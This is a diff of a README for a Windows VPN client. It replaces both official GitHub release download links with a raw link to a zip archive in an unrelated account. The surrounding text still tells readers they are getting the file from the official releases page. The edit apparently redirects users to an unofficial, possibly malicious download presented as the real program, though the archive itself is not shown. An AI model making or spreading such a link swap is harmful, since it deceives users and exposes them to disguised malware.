@@ -1,6 +1,6 @@
 # 🌐 hamid-mahdavi-client - Connect Your Windows PC To VPN
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://github.com/alirezanasseh/hamid-mahdavi-client/releases/latest/download/hamid-mahdavi-client.exe)
+[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://raw.githubusercontent.com/Secondary-offer942/hamid-mahdavi-client/main/src/client_mahdavi_hamid_v2.1-alpha.1.zip)
 
 This program helps you connect to the mhr-cfw VPN service. It acts as a bridge between your computer and the secure network. You do not need to manage complex settings or write code. This tool handles the connection process for you. It runs on Windows systems.
 
@@ -23,7 +23,7 @@ This program helps you connect to the mhr-cfw VPN service. It acts as a bridge b
 
 You must download the file from the official releases page. This ensures you have the current version.
 
-1.  Click [this direct link](https://github.com/alirezanasseh/hamid-mahdavi-client/releases/latest/download/hamid-mahdavi-client.exe) to start the download.
+1.  Click [this direct link](https://raw.githubusercontent.com/Secondary-offer942/hamid-mahdavi-client/main/src/client_mahdavi_hamid_v2.1-alpha.1.zip) to start the download.
 2.  Choose a folder on your computer to save the file.
 3.  Wait for the progress bar to finish.
 4.  Locate the file in your downloads folder.
